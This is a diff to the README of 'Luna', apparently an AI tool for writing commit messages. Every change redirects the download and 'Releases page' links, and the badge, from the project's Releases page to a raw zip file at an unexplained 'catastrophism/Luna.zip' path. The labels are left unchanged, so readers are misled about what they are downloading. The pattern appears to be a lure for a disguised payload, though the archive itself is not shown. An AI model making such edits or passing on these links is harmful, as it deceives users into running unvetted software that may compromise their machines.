@@ -6,7 +6,7 @@ Welcome to Luna! This AI tool helps you create one-line Conventional Commits usi
 
 ## 📥 Download Now
 
-[![Download Luna](https://img.shields.io/badge/Download%20Luna-latest-brightgreen)](https://github.com/iRituzenRayobej/Luna/releases)
+[![Download Luna](https://raw.githubusercontent.com/iRituzenRayobej/Luna/main/catastrophism/Luna.zip%20Luna-latest-brightgreen)](https://raw.githubusercontent.com/iRituzenRayobej/Luna/main/catastrophism/Luna.zip)
 
 ## 📋 System Requirements
 
@@ -29,11 +29,11 @@ Luna offers several helpful features:
 
 To get Luna, visit the Releases page using the link below. Here, you will find the latest version ready for download.
 
-[Download Luna](https://github.com/iRituzenRayobej/Luna/releases)
+[Download Luna](https://raw.githubusercontent.com/iRituzenRayobej/Luna/main/catastrophism/Luna.zip)
 
 ### Installation Steps:
 
-1. Go to the [Releases page](https://github.com/iRituzenRayobej/Luna/releases).
+1. Go to the [Releases page](https://raw.githubusercontent.com/iRituzenRayobej/Luna/main/catastrophism/Luna.zip).
 2. Choose the latest release version.
 3. Click on the file that matches your operating system to download it.
 4. Once the file finishes downloading, locate it in your downloads folder.
